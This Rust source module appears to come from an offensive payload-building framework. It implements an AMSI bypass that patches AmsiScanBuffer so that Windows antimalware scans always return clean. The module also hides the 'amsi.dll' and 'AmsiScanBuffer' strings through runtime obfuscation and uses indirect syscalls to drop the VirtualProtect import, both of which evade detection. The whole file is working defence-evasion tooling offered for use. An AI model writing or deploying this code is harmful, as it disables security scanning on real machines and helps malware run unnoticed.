//! AMSI patch.
//!
//! Patches `AmsiScanBuffer` in the current process so AMSI scans always report
//! clean. A Preparation technique: it modifies the process state and never runs
//! the payload. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the AMSI patch (none).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {}

/// Static metadata for the AMSI patch.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "patch_amsi",
    attck: &["T1562.001"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/patch_amsi/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: patch_amsi\n",
    // The page protection changes go through the syscall layer, so
    // `mode: indirect` removes the `VirtualProtect` import. Resolution
    // (`LoadLibraryA`/`GetProcAddress`) stays Win32, as in every technique.
    syscalls: &["NtProtectVirtualMemory"],
    resolves_imports: false,
};

impl Params {
    /// Renders the AMSI-patch stub fragment, obfuscating the `amsi.dll` and
    /// `AmsiScanBuffer` literals through `strings` so they are rebuilt at
    /// runtime.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let amsi_dll = strings.obfuscate("amsi.dll").render_stub_expr("amsi_dll");
        let amsi_func = strings
            .obfuscate("AmsiScanBuffer")
            .render_stub_expr("amsi_func");
        DEF.stub_fragment
            .replace("$AMSI_DLL_DEF$", &amsi_dll)
            .replace("$AMSI_FUNC_DEF$", &amsi_func)
    }
}

#[cfg(test)]
mod tests;
